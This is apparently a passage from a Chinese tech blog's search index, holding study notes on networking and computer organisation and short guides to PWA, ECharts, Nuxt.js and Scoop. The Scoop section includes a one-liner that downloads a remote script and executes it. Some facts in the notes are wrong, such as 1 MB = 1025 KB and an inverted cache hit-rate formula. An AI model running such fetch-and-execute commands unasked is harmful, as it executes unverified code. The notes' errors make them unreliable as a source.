址，硬件地址，每个设备都有唯一的MAC地址，用48个比特位来表示，使用16进制）\nMAC地址表：映射MAC地址到硬件接口上\n以太网协议是数据链路层的协议，以太网协议是局域网技术，以太网协议用于完成相邻设备的数据帧传输\n网络层（数据路由，数据在网络传输的路径，跨局域网，跨节点）\n路由器的顶层是网络层，没有使用到传输层和应用层\n网络层的ip协议，子网划分\n虚拟互连网络（物理网络复杂，使用IP协议时，将无需关心物理网络的差异）\n网络层利用IP协议来将使用IP协议的计算机连接起来，就好像这些计算机只需要连接一个虚拟互连网络一样，无需关心底层经过了哪些网关，路由器，ISP等等，将专注于数据的转发工作\nIP协议\nIP地址（v4只有32位，v6有128位），ipv4使用点分十进制表示，使用4组从0到255的数字表示ip地址，ipv6使用冒分十六进制，用8组4位的16进制表示ipv6地址","title":"计算机网络学习笔记"},{"content":"计算机发展历史\n1946-1957，电子管计算机，1957-1964，晶体管计算机，1964-1980，集成电路计算机，1980-至今，超大规模集成电路计算机\n电子管计算机：二战时期，英国为了破译德国的无线电密文，而发明了电子管计算机，最出名的电子管计算机莫过于埃尼阿克（ENIAC），埃尼阿克是美国军方为了计算弹道而诞生的，埃尼阿克长30多米，高2.4米，宽6米，拥有18000多个电子管，70000个电阻，10000个电容，1500个续电，6000多个开关，运行耗电150千瓦，重30吨，占地1500平方英寸（140平方米），造价48万美元，运算速度每秒5000次\n电子管计算机特点：集成度低，占空间大，功耗高，操作复杂（更换程序需要接线）\n晶体管计算机：诞生原因是因为贝尔实验室发明晶体管，1956年诺贝尔物理奖授予贝尔实验室发明晶体管的科学家，第一台晶体管计算机TX-0诞生于MIT的林肯实验室，当时的最强晶体管计算机PDP-1具备4k内存，每秒可执行20万条指令，具备512x512显示器（也是世界第一个显示器，也因为这个计算机携带了显示器的原因，而诞生了世界第一款电子游戏，太空战争）\n晶体管计算机特点：对于电子管计算机来说，集成度高，空间占据小，功耗比电子管低，运行速度快\n集成电路计算机：诞生原因是因为德州仪器的工程师发明了集成电路（IC），操作系统也因为集成电路计算机的出现而诞生，当时为了解决IBM的2款集成电路计算机（7094和1401）所编写的程序无法相互兼容，IBM而推出了System/360（操作系统雏形）\n超大规模集成电路计算机：芯片集成超大规模的集成电路\n微型计算机发展历史：因为集成电路计算机的诞生，计算机逐渐从庞然大物变成小型，乃至微型，1971到1973年，500khz频率的微型计算机（8位），1973到1978年，高于1mhz的微型计算机（8位），1978到1985年，500mhz的微型计算机（16位），1985到2000年，高于1ghz的微型计算机（32位），2000年到至今，高于2ghz的微型计算机（64位）\n摩尔定律：当价格不变的情况下，集成电路的性能，会每18至24个月提升一倍\n后来因为集成电路太密集，热损耗也越来越高，无法解决，摩尔定律也因此失效\n因为摩尔定律的失效，单核已到瓶颈，转而搞多核CPU，2005年，英特尔发布了奔腾系列的双核CPU，AMD也发布了速龙系列的双核CPU，2006年，英特尔发布酷睿四核CPU，至今AMD的服务器级霄龙处理器CPU可以高达64核，而且基准频率（单核频率）可以达到2Ghz以上\n计算机的分类\n超级计算机：功能最强，运算最快，存储容量最大的计算机，用于天气预报，海洋监测，生物制药，科学计算，航天等等需要超大运算的领域，衡量超级计算机的单位是TFlop/s（每秒一万亿次浮点计算）\n著名的超级计算机有Summit，神威太湖之光，天河一号，天河二号，Sierra\n天河二号位于广州大学城的中山大学校区的国家超级计算机广州中心\n大型计算机：又被称为大型机，大型机面向大型商业公司，维护成本高，硬件不易扩展，IBM占据大型机的大片市场，IBM为IOE中的I（计算机提供商）\n迷你计算机（服务器）：目前已替代大型机，为企业主要计算顶梁柱\n工作站：高端微型计算机，面向需要强性能的专业工作者（例如图形，视频）\n微型计算机（个人计算机）：又分为台式计算机，笔记本计算机，一体化计算机\n计算机体系和结构\n冯诺依曼体系：将指令和数据一起存储的计算机设计概念结构，使用通用电路设计，而不是使用专用电路，将指令存储，再将指令编译成通用电路可理解的程序\n冯诺依曼体系要求具备存储器，控制器，运算器，输入/输出设备\n冯诺依曼体系要求能将程序和数据发送给计算机（输入），能长期存储程序，数据，计算过程，计算结果的功能（存储器），具备算术，逻辑处理和数据传送等数据处理功能（运算器和控制器），并且能将处理结果反馈给用户（输出）\n冯诺依曼瓶颈：CPU和存储器速率之间无法调和，导致CPU空转等待数据传输\n现代计算机都是基于冯诺依曼体系的（解决冯诺依曼瓶颈），存储器和运算器，以及控制器整合在一起（就是CPU），CPU内部的存储器更高速（寄存器）\n计算机层次和编程语言\n程序编译和程序解析（计算机无法理解人类语言），需要进行语言（高级语言对低级语言）的转换\n高级语言生成低级语言的过程叫程序编译，而生成的工具叫编译器\n常见的编译型语言有C，C++，Golang\n高级语言作为输入，低级语言接收输入，从而达到高转低的目的，这个过程叫程序解析，而这个低级语言接收的工具叫解析器，解析器必须是用低级语言编写的\n常见的解析型语言有Python，PHP\njava是编译+解析语言，因为它会将源程序编译成JVM字节码，JVM虚拟机再将JVM字节码再解析成机器码，java的跨平台就是因为JVM虚拟机解析器\n计算机的层次：硬件逻辑层，微程序机器层，传统机器层，操作系统层，汇编语言层，高级语言层，应用层\n硬件逻辑层：由门电路和触发器等逻辑电路组成\n微程序机器层：由微指令组成的微程序直接交给硬件执行\n传统机器层：CPU指令集，不同架构CPU使用不同的CPU指令集\n这3层都为机器硬件层，一个指令就是一个微程序，也是一组微指令\n操作系统层：向上提供操作界面，向下对应指令系统，管理硬件（例如分配内存空间）\n汇编语言层：汇编语言可以直接编译成机器语言，完成翻译的工具叫汇编器\n高级语言层：高级语言\n应用层：应用软件\n计算机的计算单位\n容量单位\n在物理层次，用高低电平来记录信息（低电平为0，高电平为1，一个0/1的位被叫为bit（比特位））\n1字节（Byte）等于8bit\n1Kb（千字位）等于1024字节（Byte）\n1mb（兆字节）等于1025kb（千字节）\n1Gb（吉字节）等于1024mb（兆字节）\n1tb（太字节）等于1024gb（吉字节）\n1pb（拍字节）等于1024tb（太字节）\n1eb（艾字节）等于1024pb（拍字节）\n1024是2的10次方\n对于硬盘制造商来说，使用10进制，也就是硬盘制造商认为1000G才是1tb\n因此实质硬盘容量为购买标注的容量（例如240G）乘以1000的3次方，再除于1024的3次方，得到的数就是实质硬盘的容量\n原因是硬盘制造商为了记录硬盘的扇区，使用人类可理解的10进制，而不是2进制\n速度单位\n网络速度\n网络传输数据的单位为Mbps\n因此100M宽带就是指100Mbit/s，每秒传输100Mbps\n100Mbit换算字节就是100/8，也就是12.5MB，因此100m宽带峰值每秒可以传输12.5mb\nCPU速度（CPU的时钟频率，Hz）\nHz是每秒中的周期性变动重复次数的计量\n例如 3.30 GHz的CPU，就是3.3*1000^3Hz，也就是每秒可以达到33亿次的高低电平变化\n计算机的字符和编码集\n字符编码集的历史\nASCII码：ASCII码包含95个可打印字符和33个不可打印的字符（例如控制字符），用7个bits表示一个ASCII码（95+33就是128，也就是2的7次方）\n因为ASCII码无法满足需求（例如π），而推出了Extended ASCII码，由原来的7个bits变成8个bits，也就是支持256个字符\n中文编码集\n国标GB2312，诞生于1980年，中文名为信息交换用汉字编码字符集-基本集，GB2312收录了7445个字符（6763个汉字和682个其他字符）\n因为GB2312不符合国际标准，因此推出GBK（汉字内码扩展规范），向下兼容GB2312，向上支持国际ISO标准，GBK收录了21003个汉字，支持全部中日韩汉字\n为了解决全球的字符集问题，推出了Unicode（又被叫为统一码，万国码，单一码），Unicode定义的世界通用的编码集，并且使用UTF-x来对Unicode进行编码（这个x表示一个字符占多少bits，例如utf-8就是指，1个字符占了8个bits）\n计算机组成\n总线：解决不同设备之间的通信问题\n常见的总线有：\nUSB：全称Universal Serial Bus（通用串行总线）\nPCI总线（外置显卡）\nISA总线\nThunderbolt总线\n总线分2种，片内总线（就是芯片内部的总线，传递芯片内部的信息），系统总线（就是连接计算机外围设备的总线，负责CPU，内存，IO设备之间的信息传递）\n系统总线又分为数据总线（数据总线的位数（总线宽度）一般于CPU位数相同，64位（可以一次传输64位，8个字节的数据），负责双向传输数据信息），地址总线（指定数据的内存中的地址，位数为n时，寻址范围为0到2的n次方，位数和存储单元的位数有关系），控制总线（负责传输控制信号，控制信号通过控制总线，从这一个组件传输给另一个组件（例如显卡发送控制信号给显示器），而且还可以监控设备是否就绪）\n总线仲裁（解决多个设备就绪，总线的使用权分配问题）\n仲裁控制器：控制设备使用总线的优先顺序\n仲裁方法：链式查询（仲裁控制器连接总线的全部设备（串连），需要使用总线的设备发送仲裁，优先级高的最先允许，使用完毕，再询问下一个设备，直到没有需要，这就是链式查询），计时器定时查询（仲裁控制器使用计数器累计计数，当接收到仲裁信号后，向全部设备发送计数值，当计数值和设备编码一致时获取使用权），独立请求（每个设备都有总线独立连接仲裁器，设备都可以向仲裁控制器单独发送请求和接收请求）\n输入/输出设备\n常见输入/输出设备：字符输入设备（键盘），图形输入设备（鼠标，数位板，扫描仪），图像输出设备（显示器，打印机，投影仪）\n输入/输出接口通用设计：允许读取数据，允许向设备发送数据，允许检测设备是否被占用，允许检查设备是否已连接，允许检查设备已启动\n数据线（I/O设备与主机传输数据，单向，双向），状态线（I/O设备向主机报告的信息线，主机可以通过该线来查询设备是否已经正常连接并且已经就绪，也可以查询设备是否被其他进程占用），命令线（CPU向设备发送命令的信号线），设备选择线（主机选择I/O设备进行操作的信号线）\nCPU与IO设备通信：程序中断（IO设备就绪，会向CPU发生中断信号，CPU接收到中断信号后，会执行中断程序工作，会暂停当前进程的工作，转而处理该I/O设备的工作，完成后再恢复到之前进程的工作），DMA（直接存储区访问，DMA直接连接主存和设备，DMA工作期间不需要CPU参与，而是作为主存和设备的中间件，来做到IO设备的数据交换）\n计算机存储器\n存储器的分类\n按存储介质分类，分为半导体存储器（内存，固态硬盘）和磁存储器（磁盘（机械硬盘），磁带）\n按存取方式分类，分为随机存储器（RAM），串行存储器（按顺序读写），只读存储器（ROM）\n缓存（CPU的寄存器），主存（内存），辅存（硬盘）\n存储器的层次结构：CPU可以与主存互相访问，缓存可以和CPU互相访问，也可以和主存互相访问，主存和辅存之间互相访问\nCPU和缓存，以及主存构成缓存-主存层次，而主存和辅存又构成了主存-辅存层次\n局部性原理：CPU访问存储器时，存取指令和存取数据，其访问的存储单元都是聚集在一个连续区域中\n缓存-主存层次是为了解决CPU速度和主存速度不匹配的，在CPU和主存之间再加一层缓存，CPU运行时，可以将数据临时存储在该缓存中，而且不需要完全依赖于主存来做数据存储媒介（主存对于CPU来说还是太慢，需要等待主存处理完毕），提高CPU的利用率\n主存-辅存层次是为了解决主存容量不够的问题，在主存之外添加辅助存储器（例如硬盘）\n对于超过主存的程序运行，利用局部性原理，将当前用到的数据存储到主存，还没有用到的先存储到辅存中\n主存储器和辅助存储器\n主存储器：内存（RAM，随机存取存储器，Random Access Memory）\nRAM通过电容存储数据，必须每隔一段时间刷新一次（刷新需要电存在，如果长时间没有刷新将丢失电容里的电子，从而导致数据丢失），因此掉电后，数据会在一段时间后丢失\nRAM主要由半导体存储体，驱动器，译码器，读写电路，控制电路组成\nCPU利用主存数据寄存器（MDR）通过数据总线来连接读写电路（来完成读写内存工作）\n通过主存地址寄存器（MAR），通过地址总线来连接译码器（完成传输数据，数据存储地址工作）\n操作系统的位数决定了最大寻址区域，32位操作系统最大支持4GB内存（2^32=42^30），64位操作系统最大支持2^34GB（2^64=2^342^30）\n辅助存储器，例如磁盘（由盘片（可磁化的硬磁特性材料构成），读写磁头（移动磁头来读取磁道信息），磁道，扇区（磁道的一部分）组成）\n磁盘调度算法：先来先服务算法，最短寻道时间优先算法，扫描算法（电梯算法），循环扫描算法\n先来先服务算法：按照顺序来访问磁道的读写\n最短寻道时间优先算法：优先访问离磁头最近的磁道\n扫描算法（电梯算法）：磁头每次只往一个方向移动，只有到达尽头时才会反方向移动（因为和电梯调度是一样的，因此又叫电梯算法）\n循环扫描算法：基于扫描算法的优化版本，只向一个方向移动，到达尽头不会反方向移动，而是回到起点，继续一个方向移动\n计算机高速缓存\n计算机缓存的工作原理\n字：指存储在一个存储单元中的二进制组合（是存储最小的单元）\n字块：指存储在连续的存储单元中，也就是一个单元的一组字\n如果一个字是64位，并且一个字块有n个字，存储器一共有x个字块，nx就是总字数，而nx*64就是这个存储器的总容量（bits）\n字的地址：前几位表示字块的地址，后几位表示该字在字块的地址\n当CPU需要的数据存在于缓存中时，往缓存获取，需要的数据不存在时，向主存获取\n缓存命中率是衡量缓存的性能基础，如果每次需要的数据都在缓存时，命中率为1\n缓存命中率计算公式：访问主存的次数除以访问主存的次数加访问缓存的次数的和，得到的数就是这个缓存的命中率（占访问总次数的比例）\n缓存访问效率也是衡量缓存的性能基础，计算公式为访问缓存的时间除以访问主存的时间\n缓存替换策略：当缓存没有数据时，需要向主存载入需要的数据，主要有4种算法，随机算法，先进先出算法（FIFO），最不经常使用算法（LFU），最近最少使用算法（LRU）\n随机算法：每一次发生替换时，随机选取缓存的位置，将对应的位置替换\n先进先出算法（FIFO）：将缓存看成先进先出的队列，队列满后发生替换时，优先替换最先进入队列的字块\n最不经常使用算法（LFU）：优先替换最不经常使用的字块，需要提供空间来记录字块的使用频率\n最近最少使用算法（LRU）：优先替换最近一段时间内最少使用的字块（可以利用双向链表结构，保证链首是使用的字块，链尾是最不经常使用的字块，只需要将链尾去掉，将新的字块放到链首）\n指令系统\n机器指令由操作码和地址码组成，操作码指定指令需要完成的操作，操作码的位数决定了机器的操作种类，例如8位操作码表示有256种操作种类，地址码是指定数据或者数据的地址，根据地址码又分为三地址指令，二地址指令，以及一地址指令和零地址指令，就是指令有多少个数据地址\n机器指令的操作类型：数据传输类型，算术逻辑操作类型，移位操作类型，控制指令（例如中断指令）\n机器指令的寻址\n指令寻址：顺序寻址，跳跃寻址\n数据寻址：立即寻址，直接寻址，间接寻址（给出的地址是数据地址的地址，再根据数据地址，找到数据）\n计算机的控制器\n控制器是控制计算机和协调计算机的\n控制器由程序计数器（存储下一条指令的地址），时序发生器（发送时序脉冲，CPU根据时序脉冲来进行工作），指令译码器（翻译操作码对应的操作，传输地址码对应的数据），寄存器（通用（暂时存放或者发送数据或者指令，也负责保存算术逻辑单元的中间结果），指令（存取计算机指令），主存地址（保存当前CPU正在访问的内存单元地址），主存数据（保存当前CPU正在读取或者写入的主存数据）），总线组成\n计算机的运算器\n运算器由数据缓冲器，算术逻辑单元（ALU），通用寄存器，状态字寄存器，以及总线组成\n数据缓冲器分为输入缓存（暂时存放外部设备发送过来的数据）和输出缓冲（暂时存放需要发送给外部设备的数据）\n算术逻辑单元（ALU）是运算器核心，可以完成算术运算（位运算，加减乘除等等）\n状态字寄存器是存放运算状态的（例如进位，结果的正负，条件码，溢出等等），也可以存放运算控制信息（例如允许中断位，调试跟踪标记位等等）\n计算机指令执行过程（获取指令，分析指令，执行指令）\n指令执行过程的交互发生在片内总线\n通过缓存获取指令，再将指令通过片内总线发送给指令寄存器，暂时存放这个指令操作码和地址码（并不知道指令的具体内容），再通过指令译码器来获取指令具体内容，指令译码器通过片内总线发送控制信号给运算器，程序计算数+1（表示轮到下一个指令执行），执行指令会先将数据存储在数据寄存器，算术逻辑单元处理数据，并且状态字寄存器记录运算的状态，指令完成后发送运算结果\n","permalink":"https://99999.fun/posts/155/","summary":"计算机发展历史\n1946-1957，电子管计算机，1957-1964，晶体管计算机，1964-1980，集成电路计算机，1980-至今，超大规模集成电路计算机\n电子管计算机：二战时期，英国为了破译德国的无线电密文，而发明了电子管计算机，最出名的电子管计算机莫过于埃尼阿克（ENIAC），埃尼阿克是美国军方为了计算弹道而诞生的，埃尼阿克长30多米，高2.4米，宽6米，拥有18000多个电子管，70000个电阻，10000个电容，1500个续电，6000多个开关，运行耗电150千瓦，重30吨，占地1500平方英寸（140平方米），造价48万美元，运算速度每秒5000次\n电子管计算机特点：集成度低，占空间大，功耗高，操作复杂（更换程序需要接线）\n晶体管计算机：诞生原因是因为贝尔实验室发明晶体管，1956年诺贝尔物理奖授予贝尔实验室发明晶体管的科学家，第一台晶体管计算机TX-0诞生于MIT的林肯实验室，当时的最强晶体管计算机PDP-1具备4k内存，每秒可执行20万条指令，具备512x512显示器（也是世界第一个显示器，也因为这个计算机携带了显示器的原因，而诞生了世界第一款电子游戏，太空战争）\n晶体管计算机特点：对于电子管计算机来说，集成度高，空间占据小，功耗比电子管低，运行速度快\n集成电路计算机：诞生原因是因为德州仪器的工程师发明了集成电路（IC），操作系统也因为集成电路计算机的出现而诞生，当时为了解决IBM的2款集成电路计算机（7094和1401）所编写的程序无法相互兼容，IBM而推出了System/360（操作系统雏形）\n超大规模集成电路计算机：芯片集成超大规模的集成电路\n微型计算机发展历史：因为集成电路计算机的诞生，计算机逐渐从庞然大物变成小型，乃至微型，1971到1973年，500khz频率的微型计算机（8位），1973到1978年，高于1mhz的微型计算机（8位），1978到1985年，500mhz的微型计算机（16位），1985到2000年，高于1ghz的微型计算机（32位），2000年到至今，高于2ghz的微型计算机（64位）\n摩尔定律：当价格不变的情况下，集成电路的性能，会每18至24个月提升一倍\n后来因为集成电路太密集，热损耗也越来越高，无法解决，摩尔定律也因此失效\n因为摩尔定律的失效，单核已到瓶颈，转而搞多核CPU，2005年，英特尔发布了奔腾系列的双核CPU，AMD也发布了速龙系列的双核CPU，2006年，英特尔发布酷睿四核CPU，至今AMD的服务器级霄龙处理器CPU可以高达64核，而且基准频率（单核频率）可以达到2Ghz以上\n计算机的分类\n超级计算机：功能最强，运算最快，存储容量最大的计算机，用于天气预报，海洋监测，生物制药，科学计算，航天等等需要超大运算的领域，衡量超级计算机的单位是TFlop/s（每秒一万亿次浮点计算）\n著名的超级计算机有Summit，神威太湖之光，天河一号，天河二号，Sierra\n天河二号位于广州大学城的中山大学校区的国家超级计算机广州中心\n大型计算机：又被称为大型机，大型机面向大型商业公司，维护成本高，硬件不易扩展，IBM占据大型机的大片市场，IBM为IOE中的I（计算机提供商）\n迷你计算机（服务器）：目前已替代大型机，为企业主要计算顶梁柱\n工作站：高端微型计算机，面向需要强性能的专业工作者（例如图形，视频）\n微型计算机（个人计算机）：又分为台式计算机，笔记本计算机，一体化计算机\n计算机体系和结构\n冯诺依曼体系：将指令和数据一起存储的计算机设计概念结构，使用通用电路设计，而不是使用专用电路，将指令存储，再将指令编译成通用电路可理解的程序\n冯诺依曼体系要求具备存储器，控制器，运算器，输入/输出设备\n冯诺依曼体系要求能将程序和数据发送给计算机（输入），能长期存储程序，数据，计算过程，计算结果的功能（存储器），具备算术，逻辑处理和数据传送等数据处理功能（运算器和控制器），并且能将处理结果反馈给用户（输出）\n冯诺依曼瓶颈：CPU和存储器速率之间无法调和，导致CPU空转等待数据传输\n现代计算机都是基于冯诺依曼体系的（解决冯诺依曼瓶颈），存储器和运算器，以及控制器整合在一起（就是CPU），CPU内部的存储器更高速（寄存器）\n计算机层次和编程语言\n程序编译和程序解析（计算机无法理解人类语言），需要进行语言（高级语言对低级语言）的转换\n高级语言生成低级语言的过程叫程序编译，而生成的工具叫编译器\n常见的编译型语言有C，C++，Golang\n高级语言作为输入，低级语言接收输入，从而达到高转低的目的，这个过程叫程序解析，而这个低级语言接收的工具叫解析器，解析器必须是用低级语言编写的\n常见的解析型语言有Python，PHP\njava是编译+解析语言，因为它会将源程序编译成JVM字节码，JVM虚拟机再将JVM字节码再解析成机器码，java的跨平台就是因为JVM虚拟机解析器\n计算机的层次：硬件逻辑层，微程序机器层，传统机器层，操作系统层，汇编语言层，高级语言层，应用层\n硬件逻辑层：由门电路和触发器等逻辑电路组成\n微程序机器层：由微指令组成的微程序直接交给硬件执行\n传统机器层：CPU指令集，不同架构CPU使用不同的CPU指令集\n这3层都为机器硬件层，一个指令就是一个微程序，也是一组微指令\n操作系统层：向上提供操作界面，向下对应指令系统，管理硬件（例如分配内存空间）\n汇编语言层：汇编语言可以直接编译成机器语言，完成翻译的工具叫汇编器\n高级语言层：高级语言\n应用层：应用软件\n计算机的计算单位\n容量单位\n在物理层次，用高低电平来记录信息（低电平为0，高电平为1，一个0/1的位被叫为bit（比特位））\n1字节（Byte）等于8bit\n1Kb（千字位）等于1024字节（Byte）\n1mb（兆字节）等于1025kb（千字节）\n1Gb（吉字节）等于1024mb（兆字节）\n1tb（太字节）等于1024gb（吉字节）\n1pb（拍字节）等于1024tb（太字节）\n1eb（艾字节）等于1024pb（拍字节）\n1024是2的10次方\n对于硬盘制造商来说，使用10进制，也就是硬盘制造商认为1000G才是1tb\n因此实质硬盘容量为购买标注的容量（例如240G）乘以1000的3次方，再除于1024的3次方，得到的数就是实质硬盘的容量\n原因是硬盘制造商为了记录硬盘的扇区，使用人类可理解的10进制，而不是2进制\n速度单位\n网络速度\n网络传输数据的单位为Mbps\n因此100M宽带就是指100Mbit/s，每秒传输100Mbps\n100Mbit换算字节就是100/8，也就是12.5MB，因此100m宽带峰值每秒可以传输12.5mb\nCPU速度（CPU的时钟频率，Hz）\nHz是每秒中的周期性变动重复次数的计量\n例如 3.30 GHz的CPU，就是3.3*1000^3Hz，也就是每秒可以达到33亿次的高低电平变化\n计算机的字符和编码集\n字符编码集的历史\nASCII码：ASCII码包含95个可打印字符和33个不可打印的字符（例如控制字符），用7个bits表示一个ASCII码（95+33就是128，也就是2的7次方）\n因为ASCII码无法满足需求（例如π），而推出了Extended ASCII码，由原来的7个bits变成8个bits，也就是支持256个字符","title":"计算机组成原理学习笔记"},{"content":"PWA，Progressive Web App（渐进式web应用），PWA技术可以将web应用具备接近原生应用的特性和用户体验，无需额外安装，支持离线缓存，消息推送等功能\nPWA由Service Worker，Promise，fetch，cache Api，Notification Api等技术组成\nService Worker：服务工作线程，独立于主线程，常驻内存，代理网络请求，依赖HTTPS通信\n注册Service Worker\nnavigator.serviceWorker.register('./sw.js',{scope: '/'}).then(\rregistration =\u0026gt; {\rconsole.log(registration)\r},error =\u0026gt; {\rconsole.error(error)\r}\r)\rwindow.onload = function() {\rdocument.body.append('PWA!')\r}\rsw.js\nconst cachename = 'v1'\rself.addEventListener('install', function (event) {\rconsole.log('install',event)\r// 安装新的Service Worker脚本时触发，只有Service Worker脚本不同，会认为是不同的Service Worker版本\revent.waitUntil(new Promise(resolve =\u0026gt;{\rsetTimeout(resolve, 1000) // 安装新的Service Worker脚本后等待1秒后激活该脚本\r}))\r// event.waitUntil(self.skipWaiting) // 强制停止老的Service Worker，激活启动新的Service Worker，只要有更新就激活新的\revent.waitUntil(caches.open(name).then(cache =\u0026gt;{\rcache.addAll([\r'/',\r'./1.img'\r])\r})) // 开启cache api缓存系统\r})\rself.addEventListener('activate', function (event) {\rconsole.log('activate',event)\r// 激活新的Service Worker脚本事件\revent.waitUntil(self.clients.claim())\revent.waitUntil(caches.keys().then(cacheNames =\u0026gt;{\rreturn Promise.all(cacheNames.map(cacheNames =\u0026gt;{\rif(cacheNames !== cachename){\rcaches.delete(cacheNames) // 当前缓存名称不等于设置的缓存名称时，清除缓存，重新获取资源\r}\r}))\r}))\r})\rself.addEventListener('fetch', function (event) {\rconsole.log('fetch',event)\r// 获取资源请求事件，例如增加外链\revent.respondWith(caches.open(cachename).then(cache =\u0026gt; {\rreturn cache.match(event.request).then(response =\u0026gt;{\rif(response){\rreturn response // 命中缓存则直接使用缓存\r}\rreturn fetch(event.request).then(response =\u0026gt;{\rcache.put(event.request,response.clone())\r// 没有命中则获取该资源\rreturn response\r})\r})\r}))\r})\rmanifest.json：让web应用具备app的效果，例如logo，启动页面\n{\r\u0026quot;name\u0026quot;: \u0026quot;hallo\u0026quot;,\r\u0026quot;short_name\u0026quot;: \u0026quot;你好\u0026quot;,\r\u0026quot;display\u0026quot;: \u0026quot;standalone\u0026quot;,\r\u0026quot;orientation\u0026quot;: \u0026quot;landscape\u0026quot;,\r\u0026quot;start_url\u0026quot;: \u0026quot;/\u0026quot;,\r\u0026quot;theme_color\u0026quot;: \u0026quot;purple\u0026quot;,\r\u0026quot;background_color\u0026quot;: \u0026quot;purple\u0026quot;,\r\u0026quot;icons\u0026quot;: [\r{\r\u0026quot;src\u0026quot;: \u0026quot;logo.jpg\u0026quot;,\r\u0026quot;sizes\u0026quot;: \u0026quot;48x48\u0026quot;,\r\u0026quot;type\u0026quot;: \u0026quot;image/jpg\u0026quot;\r},\r{\r\u0026quot;src\u0026quot;: \u0026quot;logo1.jpg\u0026quot;,\r\u0026quot;sizes\u0026quot;: \u0026quot;144x144\u0026quot;,\r\u0026quot;type\u0026quot;: \u0026quot;image/jpg\u0026quot;\r}\r]\r}\rNotification消息推送\n查看授权\nNotification.permission\n有3个值，在浏览器默认为default，当同意时，为granted，当不同意时，为denied\n在Service Worker中，默认为denied，因为Service Worker不能弹出授权请求，必须先在浏览器中同意后，Service Worker只能发送通知\n请求授权\nNotification.requestPermission().then(permission =\u0026gt; console.log(permission))\n发送通知\nnew Notification(\u0026lsquo;hallo word\u0026rsquo;, {body: \u0026lsquo;hallo\u0026rsquo;})\n在Service Worker发送通知\nself.registration.showNotificatio(\u0026lsquo;hallo word\u0026rsquo;)\n成熟的PWA插件，workbox\n","permalink":"https://99999.fun/posts/154/","summary":"PWA，Progressive Web App（渐进式web应用），PWA技术可以将web应用具备接近原生应用的特性和用户体验，无需额外安装，支持离线缓存，消息推送等功能\nPWA由Service Worker，Promise，fetch，cache Api，Notification Api等技术组成\nService Worker：服务工作线程，独立于主线程，常驻内存，代理网络请求，依赖HTTPS通信\n注册Service Worker\nnavigator.serviceWorker.register('./sw.js',{scope: '/'}).then(\rregistration =\u0026gt; {\rconsole.log(registration)\r},error =\u0026gt; {\rconsole.error(error)\r}\r)\rwindow.onload = function() {\rdocument.body.append('PWA!')\r}\rsw.js\nconst cachename = 'v1'\rself.addEventListener('install', function (event) {\rconsole.log('install',event)\r// 安装新的Service Worker脚本时触发，只有Service Worker脚本不同，会认为是不同的Service Worker版本\revent.waitUntil(new Promise(resolve =\u0026gt;{\rsetTimeout(resolve, 1000) // 安装新的Service Worker脚本后等待1秒后激活该脚本\r}))\r// event.waitUntil(self.skipWaiting) // 强制停止老的Service Worker，激活启动新的Service Worker，只要有更新就激活新的\revent.waitUntil(caches.open(name).then(cache =\u0026gt;{\rcache.addAll([\r'/',\r'./1.img'\r])\r})) // 开启cache api缓存系统\r})\rself.","title":"简单使用PWA技术"},{"content":"ECharts是基于JavaScript的数据可视化图表库\n安装\nnpm install echarts --save\r第一个实例\nimport * as echarts from 'echarts'\rlet app = echarts.init(document.getElementById('app'), null, {\rwidth: 800,\rheight: 500\r})\rlet data = {\rtitle: {\rtext: '用户管理'\r},\rtooltip:{},\rlegend: {\rdata: ['用户']\r},\rxAxis: {\rdata: [\r'root','admin','user1','user2','user3'\r]\r},\ryAxis: {},\rseries: [\r{\rname: '用户权限',\rtype: 'bar',\rdata: [\r10,8,5,1,3\r]\r}\r]\r}\rapp.setOption(data)\r注意：容器必须具备高度和宽度（这里的容器的id为app），要么html指定，要么在初始化时指定一个\n","permalink":"https://99999.fun/posts/153/","summary":"ECharts是基于JavaScript的数据可视化图表库\n安装\nnpm install echarts --save\r第一个实例\nimport * as echarts from 'echarts'\rlet app = echarts.init(document.getElementById('app'), null, {\rwidth: 800,\rheight: 500\r})\rlet data = {\rtitle: {\rtext: '用户管理'\r},\rtooltip:{},\rlegend: {\rdata: ['用户']\r},\rxAxis: {\rdata: [\r'root','admin','user1','user2','user3'\r]\r},\ryAxis: {},\rseries: [\r{\rname: '用户权限',\rtype: 'bar',\rdata: [\r10,8,5,1,3\r]\r}\r]\r}\rapp.setOption(data)\r注意：容器必须具备高度和宽度（这里的容器的id为app），要么html指定，要么在初始化时指定一个","title":"ECharts数据可视化图表库简单使用"},{"content":"nuxt是一个基于vue的应用框架，用于创建服务端渲染应用，使用vite作为打包器，使用webpack作为构建工具\n创建项目\nyarn create nuxt-app test\n需要做一些选择，例如：选择TypeScript，选择Yarn，选择UI框架等等\n安装依赖\nyarn\n启动项目\nyarn dev\n构建打包\nyarn build\nyarn start\n启动测试环境 yarn test\n","permalink":"https://99999.fun/posts/152/","summary":"nuxt是一个基于vue的应用框架，用于创建服务端渲染应用，使用vite作为打包器，使用webpack作为构建工具\n创建项目\nyarn create nuxt-app test\n需要做一些选择，例如：选择TypeScript，选择Yarn，选择UI框架等等\n安装依赖\nyarn\n启动项目\nyarn dev\n构建打包\nyarn build\nyarn start\n启动测试环境 yarn test","title":"Nuxt.js学习笔记"},{"content":"Scoop是windows平台下开源的命令行软件包管理器，类似于ubuntu的apt或者macOS的brew\nscoop仓库里面全部都是通过审核的绿色软件包（前提是不要乱用来路不明的scoop源）\n允许执行本地脚本权限\nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser\n修改Scoop安装目录（用户级）\n$env:SCOOP=\u0026lsquo;D:\\Software\\Scoop\u0026rsquo; [Environment]::SetEnvironmentVariable(\u0026lsquo;SCOOP\u0026rsquo;, $env:SCOOP, \u0026lsquo;User\u0026rsquo;)\n修改Scoop安装目录（全局）\n$env:SCOOP_GLOBAL=\u0026lsquo;D:\\Software\\Scoop\\Global\u0026rsquo; [Environment]::SetEnvironmentVariable(\u0026lsquo;SCOOP_GLOBAL\u0026rsquo;, $env:SCOOP_GLOBAL, \u0026lsquo;Machine\u0026rsquo;)\n目录介绍： apps：通过scoop安装的软件存储的目录\nbuckets：管理软件的仓库目录（记录了哪些仓库有哪些软件）\nchache：软件安装包目录\npersit：存储用户数据，与软件分离\nshims；软链接\n安装scoop\niwr -useb get.scoop.sh | iex\n或者\niex (new-object net.webclient).downloadstring(\u0026lsquo;https://get.scoop.sh\u0026rsquo;)\n安装软件\nscoop install sudo\n查看环境存在的问题\nscoop checkup\n将一些scoop环境必须的软件安装一下\n搜索软件\nscoop search git\n安装软件\nscoop install git\n查看软件信息\nscoop info git\n查看已经安装的软件\nscoop list\n卸载软件（-p删除配置）\nscoop uninstall git -p\n更新软件\nscoop update 